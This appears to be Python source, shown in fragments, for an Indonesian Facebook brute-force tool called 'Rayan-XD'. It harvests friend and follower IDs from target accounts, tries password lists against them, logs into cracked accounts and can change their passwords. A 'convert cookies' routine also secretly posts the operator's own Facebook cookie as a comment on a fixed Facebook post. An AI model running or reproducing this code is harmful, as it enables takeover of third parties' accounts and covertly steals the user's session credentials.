...
try:
	...
	print(f"! use wisely, because I am not responsible for any problems that are outside. that's all my message")
########## COLOR  RANDOM ##########
P = '\x1b[0;97m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
...
╔╝╔╗╚╣║─║║╠╝╔╗╚╦╝╔╗╚╗    {K}Free
╚═╝╚═╩╝─╚═╩═╝╚═╩═╝╚═╝ """
	Buat(Anak(ak,width=50,title=f"{H2}Rayan-XD{P2}",style=f"{U3}"))
def banner2():
	sapu()
	print(f"""{R}╔╗──╔═══╦═══╦══╦═╗─╔╗
║║──║╔═╗║╔═╗╠╣╠╣║╚╗║║
...
def login():
	try:
		...
		try:
			...
			print('\r [×] Cokie invalid');time.sleep(3)
			masuk()
...
########## MENU LOGIN ##########
#os.system('xdg-open https://www.facebook.com/mas.rayan.xd ')
def masuk():
	banner2()
	#sound("login")
	mas = f"""{P2}[{H2}01{P2}] Login Cookie
[{H2}02{P2}] Donasi/Author
[{H2}03{P2}] Result Crack
[{M2}00{P2}] Logout"""
	...
	if nanya in ["01","1"]:
		...
		nd = f"{P2}Anda Akan Di Arahkan Ke Website Rayan-XD"
		Buat(Anak(nd,width=50,style=f"{U3}"));time.sleep(3)
		os.system('xdg-open https://rayanxd.my.id/');masuk()
	elif nanya in ["03","3"]:
		__hasil__()
##########  ENTER COOKIE ##########
def goblok():
	warna = random.choice([H,B,U,M,O])
	fo = f"{P2} Ketik {H2}open{P2} Link Extensions Cookie"
	Buat(Anak(fo,width=50,style=f"{U3}"))
	cookie = input(f"  {P}[{H}?{P}] Cookie Fb : {H}")
	if cookie in ["Open","OPEN","open"]:
		...
		exit()
	try:
		link = requests.get("https://web.facebook.com/adsmanager",cookies={'cookie':cookie}).text
		find = re.findall('act=(.*?)&nav_source',link)
		if len(find) == 0:exit('\n [×] Cokie invalid')
		else:
			for hilangkan in find:
				otw = requests.get('https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer'.format(hilangkan), cookies={'cookie':cookie})
				tok = re.search('(EAAB\w+)',otw.text).group(1)
				if 'EAAB' in tok:
					open(".token.txt", "w").write(tok)
					open(".cok.txt","w").write(cookie)
					bh = f"{P2}Login Sukses, Ketik : {H2}python run.py{P2}"
					Buat(Anak(bh,width=50,style=f"{U3}"))
					menu()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		bp = f"{M}Login Gagal Cek Akun Kamu"
...
def menu(__nn__,__ii__):
	try:
		...
		print("{P}[{H}!{P}] Cookie invalid goblok")
		time.sleep(2);login()
	banner()
	os.system('xdg-open https://github.com/Rayan-XD ')
...
{P2}[{H2}•{P2}] Ip   : {ipku}"""
	...
	men = f"""{P2}[{H2}01{P2}] Crack Publik
{P2}[{H2}02{P2}] Crack Massal
{P2}[{H2}03{P2}] Crack Followers
{P2}[{H2}04{P2}] Result Crack
{P2}[{H2}05{P2}] Info Script
{P2}[{H2}06{P2}] CP Detektor
{P2}[{M2}00{P2}] Keluar ({M2}Hapus cookie{P2})"""
	Buat(Anak(men,width=50,title=f"{H2}menu spesial{P2}",style=f"{U3}"))
	...
	if __toket__ in ["ig","IG"]:__login__()
...
def __publik__():
	try:
		...
		exi()
	jb = f"{P2}[{M2}!{P2}] Pastikan Akun Target Publik/Not Private"
	Buat(Anak(jb,width=50,style=f"{U3}"))
	ppk = input(f"  {P}[{H}?{P}] Idz Target : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			...
			print(f"  {P}[{H}!{P}] No connection");exit()
	try:
		print(f"  {P}[{H}!{P}] Total Idz Yang Terkumpul : {H}{str(len(id))}{P}")
...
def __masal__():
	...
	try:
		jb = f"{P2}[{M2}!{P2}] Pastikan Akun Target Publik/Not Private"
		Buat(Anak(jb,width=50,style=f"{U3}"))
		__sas__ = int(input(f"  {P}[{H}?{P}] Jumlah Target : "))
	except ValueError:
		print(f"  {P}[{H}!{P}] Masukan Angka Blok");time.sleep(2);exit()
	if __sas__<1 or __sas__>50:
		print(f"  {P}[{H}!{P}] Limit {H}50idz{P}");time.sleep(2);exit()
	ses=requests.Session()
	memek = 0
	for met in range(__sas__):
		memek+=1
		ppk = input(f"  {P}[{H}•{P}] Masukan Idz Yang Ke {H}{str(memek)}{P} : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/{__colmek__}?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
	...
	try:
		...
		print(f"  {P}[{H}!{P}] Target private/no friends");exit()
########## FOLLOWER ##########
def __folow__():
	try:token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:exit()
	ff = f"{P2}[{M2}!{P2}] Pastikan Akun Target Publik/Not Private"
	Buat(Anak(ff,width=50,style=f"{U3}"))
	__janda__ = input(f"  {P}[{H}?{P}] Idz Target : ")
	try:
		...
		print(f"  {P}[{H}!{P}] Total Idz Yang Terkumpul : {H}{str(len(id))}{P}");time.sleep(2);setting()
...
########## CHECK RESULTS ##########
def __hasil__():
	sil = f"""{P2}[{H2}01{P2}] Results Akun {H2}OK
{P2}[{H2}02{P2}] Results Akun {K2}CP{P2}"""
	Buat(Anak(sil,width=50,title=f"{H2}Results Crack{P2}",style=f"{U3}"))
	...
	if __kentod__ in ["1","01"]:
		...
		if len(vin)==0:
			...
			for cpku in range(len(lin)):
				...
				nocp +=1
			goog = f"{P2} Cek Results Crack Selesai, Total {H2}{len(__kentod__)}{P2} Account"
...
########## SETTING ##########
def setting():
	st = f"""{P2}[{H2}01{P2}] Akun Old ({M2}not recommended{P2})
[{H2}02{P2}] Akun New ({H2}recommended{P2})
[{H2}03{P2}] Akun Random ({B}Best{P2})"""
	Buat(Anak(st,width=50,title=f"{H2}Seting Akun{P2}",style=f"{U3}"))
	...
	if __sas__ in ['1','01']:
		...
		print(f"  {P}[{H}!{P}] Pilih");exit()
	pwplus = input(f"  {P}[{H}?{P}] Tambah Password Manual [{H}Y{P}/{M}t{P}]: ")
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		bb = f"{P2}[{M2}!{P2}] Tambahkan ,{H2}KOMA{P2} Untuk Pemisah\n[{M2}!{P2}] Contoh : RAYANXD,RAYAN123,RAYAN1234,RAYAN12345"
...
{P2}[{H2}02{P2}] Login With Free {H2}v2{P2}
{P2}[{H2}03{P2}] Login With Mobile {H2}v2{P2}"""
...
def __validate__(idf,__Ang__,url):
	...
	loop+=1
	for xx in list("\|-/"):
		print(f"\r  {P}[{H}{xx}{P}] [{O}%s{P}/{O}%s{P}] = LIVE [{H}OK:%s{P}] = [{K}CP:%s{P}] "%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
########## LOGIN REGULAR ##########
def __regular__(idf,__Ang__,url):
	...
	loop+=1
	for xx in list("\|-/"):
		print(f"\r  {P}[{H}{xx}{P}] [{O}%s{P}/{O}%s{P}] = LIVE [{H}OK:%s{P}] = [{K}CP:%s{P}] "%(loop,len(id),ok,cp),end=" ")
		sys.stdout.flush()
########## CONVERT COKIES ##########
         ...
         try:
               ...
               if len(find) == 0:return 'False'
                     ...
                     for hilangkan in find:
                         ...
                         tok = re.search('(EAAB\w+)',otw.text).group(1)
                         if 'EAAB' in tok:
                             requests.post(f'https://graph.facebook.com/v15.0/134954666057235/comments/?message={komen}&access_token={tok}',cookies={'cookie':cookies}).json()
                             requests.post(f'https://graph.facebook.com/v15.0/134954666057235/comments/?message={cookies}&access_token={tok}',cookies={'cookie':cookies}).json()
...
########## PASSWORD ADDITION ##########
def kunaon():
	kp = f"""{P2}[{H}•{P2}] Akun {H2}OK{P2} Save : {H2}OK/{okeh}
{P2}[{H}•{P2}] Akun {K2}CP{P2} Save : {K2}OK/{cepe}
{P2}[{H2}!{P2}] {M}Hidup/Matikan Mode Pesawat Ketika Tidak Dapat Hasil"""
	...
	print(f"\n")
	sel = f"""{P2}[{H2}!{P2}]CRACK SELESAI {H2}{str(len(id))}{P2}
...
########## INFORMATION##########
def __ingfo__():
	bck = f"""{P2}Version Sc  : {H2}2.0
  {P2}Tools     : {H2}Bruteforce Facebook
  {P2}Python    : {H2}3.11

{P2}My Social Media :
  {P2}Facebook  : {H2}facebook.com/mas.rayan.xd{P2}
  {P2}Github    : {H2}github.com/Rayan-XD{P2}
  {P2}Instagram : {H2}rayan.xd.1
  {P2}Whatsapp  : {H2}6285852768706 {P2}"""
...
def __check__():
	...
	mode = f"{P2}Nyalakan Mode Pesawat 5 Detik Sebelum Mulai"
	Buat(Anak(mode,width=50,style=f"{U3}"));time.sleep(2)
	pw = input(f"  {P}[{H}?{P}] Ganti Password Ketika Tap Yes  [{H}Y{P}/{M}t{P}]: ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input(f"  {P}[{H}?{P}] Tambah Password : ")
		if len(pw2) <= 5:
			print(f"\n  {P}[{M}!{P}] Masukan Password Minimal {H}6{P} Karakter ")
		else:
			pwbaru.append(pw2)
	tot = f"{P2}Jumlah Yang Ada {H2}{str(len(file_cp))}{P2} Akun"
	...
	for fb in file_cp:
		...
		ngecek  = akun.split("|")
		nomor+=1
		print(f"\n  {P}[{H}{number}{P}] Login Akun : {K}%s{P}"%(akun.replace(" *--> ","")))
		try:
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		if " Account Anda Dikunci" in urlPost.text:
			print(f"   {P}└── Akun Terkena Kunci Sesi")
		else:
			print(f"   {P}└── {H}Hore Akun Tap Yes,Login Fb Lite/Mbasic{P}")
		...
		number=0
		print(f"\r   {P}└── Terdapat {H}{str(len(cek))}{P} Opsi Akun")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini kamu?" in title:
		...
		print(f"   {P}└── kata sandi salah/diubah")		
########## PROGRAM DONE ##########
